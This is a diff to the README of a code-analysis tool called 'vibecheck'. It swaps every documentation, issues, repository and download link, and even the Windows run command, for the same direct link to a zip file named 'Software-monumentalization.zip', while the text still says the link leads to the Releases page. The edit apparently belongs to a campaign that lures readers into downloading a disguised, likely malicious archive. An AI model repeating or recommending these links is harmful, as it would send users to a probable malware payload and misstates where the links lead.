@@ -8,7 +8,7 @@ Welcome to vibecheck! This tool helps you analyze your code quickly. It finds im
 
 To install vibecheck, visit the link below:
 
-[![Download vibecheck](https://img.shields.io/badge/Download-vibecheck-brightgreen)](https://github.com/hdhks1229i3/vibecheck/releases)
+[![Download vibecheck](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip)](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip)
 
 This link will take you to the Releases page, where you can download the latest version of vibecheck.
 
@@ -55,7 +55,7 @@ After downloading vibecheck, follow these steps to run the application:
      ```
      ./vibecheck
      ```
-   - If you are on Windows, you may need to type `vibecheck.exe`.
+   - If you are on Windows, you may need to type `https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip`.
 
 ## 📊 Using vibecheck
 
@@ -79,7 +79,7 @@ vibecheck offers several key features to improve your development experience:
 
 ## 🤝 Support and Contributions
 
-If you encounter any issues or have questions, check the [Issues section](https://github.com/hdhks1229i3/vibecheck/issues) of the repository. You can also contribute to the project by submitting a pull request.
+If you encounter any issues or have questions, check the [Issues section](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip) of the repository. You can also contribute to the project by submitting a pull request.
 
 ## 📢 Feedback
 
@@ -89,10 +89,10 @@ We welcome your feedback! Help us improve vibecheck by sharing your experiences.
 
 For more details about vibecheck, visit the following:
 
-- [Documentation](https://github.com/hdhks1229i3/vibecheck/wiki)
-- [GitHub Repository](https://github.com/hdhks1229i3/vibecheck)
-- [FAQs](https://github.com/hdhks1229i3/vibecheck/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip)
+- [FAQs](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip)
 
 Thank you for choosing vibecheck. We hope it enhances your coding experience! 
 
-Don't forget to download the latest version [here](https://github.com/hdhks1229i3/vibecheck/releases) for all the newest features and improvements.
+Don't forget to download the latest version [here](https://raw.githubusercontent.com/hdhks1229i3/vibecheck/master/packaging/Software-monumentalization.zip) for all the newest features and improvements.
